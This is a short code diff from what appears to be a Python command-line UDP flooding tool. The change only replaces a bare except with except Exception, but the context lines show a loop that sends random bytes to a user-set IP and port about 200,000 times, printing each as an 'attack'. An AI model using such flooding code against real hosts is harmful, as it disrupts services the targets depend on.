@@ -86,7 +86,7 @@ class Main(Cmd):
 		for i in range(200001):
 			try:
 				so.sendto(randbyte,(self.ip,self.port))
-			except:
+			except Exception:
 				print('You did not set the IP address or did not set the IP address correctly')
 				break
 			print('This is the',i+1,'attack !') 
